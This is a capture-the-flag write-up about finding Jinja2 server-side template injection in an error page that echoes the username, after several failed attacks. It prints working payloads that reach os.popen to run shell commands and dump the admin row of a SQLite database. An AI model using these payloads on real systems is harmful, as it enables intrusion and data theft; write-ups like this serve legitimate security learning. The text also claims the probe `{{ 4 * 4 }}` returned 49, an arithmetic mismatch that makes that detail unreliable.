# SSTI through an error page nobody thought rendered user input

The "sequel" to the previous web challenge. Patched SQLi, more locked down. I burned a lot of time on dead ends before finding the real bug.

## What I tried first

- SQL injection on the login form: fixed.
- Byte-sequence shenanigans (`admin\0`): nothing.
- Null-user edge case: sending POST with no username/password actually created a user with `name=""`, and that user could persist likes other people could see. Interesting, no clear exploitation path.
- Cookie analysis: looked like `URLSafeTimedSerializer` (payload, timestamp, signature). Tried brute-forcing the secret with rockyou. No hit.
- Timing oracle on the password check: inconclusive, looked roughly constant-time.
- Pickle injection: nothing.
- SSTI on the "Welcome, <user>!" page: didn't work.

I gave up on SSTI too early. There was a *second* page that also rendered the username:

> "HEY <user>! STOP TRYING TO HACK US, WE KNOW WHO YOU ARE!"

This page fires on conditions like an oversized `/face` ID or an expired CSRF token. Registered with username `{{ 4 * 4 }}`, triggered the error page, got back "Hey 49!". Jinja2 SSTI on the error template.

## From SSTI to OS command execution

Standard Jinja escape:

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('<cmd>').read() }}
```

Used it to list the working directory, find the live SQLite DB, then dump the admin row:

```jinja
{{ config.__class__.__init__.__globals__['os'].popen('sqlite3 ./db.sqlite "SELECT * FROM users WHERE name=\'admin\';"').read() }}
```

The admin row came back through the same error template. Password column was the flag.

> Operational note: a payload I tried verbatim returned "User already exists". A classmate had registered the same username before me. Adding a trailing space made it unique.

## Lesson

SSTI hides anywhere user input lands inside a template renderer. The "welcome" page is the obvious place; error and warning pages get overlooked because they're not "rendered as content" in the developer's mental model. Audit every template path, not just the success cases.
